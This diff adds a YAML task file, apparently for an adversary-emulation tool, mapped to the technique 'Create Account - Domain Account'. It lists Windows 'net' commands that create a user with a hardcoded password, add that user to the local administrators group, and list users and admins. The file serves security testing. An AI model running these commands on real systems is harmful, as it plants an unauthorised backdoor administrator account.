@@ -1,0 +1,27 @@
+name: T1136-002
+count: 1
+defaultoutputfile: T1136-002.txt
+description: Create Account - Domain Account
+options:
+  attack1:
+    Command1:
+      type: CLI
+      write: net user T1136.002_Admin T1136_pass123 /add 
+      description: Add new user
+      outfile: default
+    Command2:
+      type: CLI
+      write: net localgroup administrators T1136.002_Admin /add 
+      description: Escalate priviledges
+      outfile: default
+    Command3:
+      type: CLI
+      write: net users
+      description: Display users on remote
+      outfile: default
+    Command4:
+      type: CLI
+      write: net localgroup administrators
+      description: Display administrators group
+      outfile: default 
+
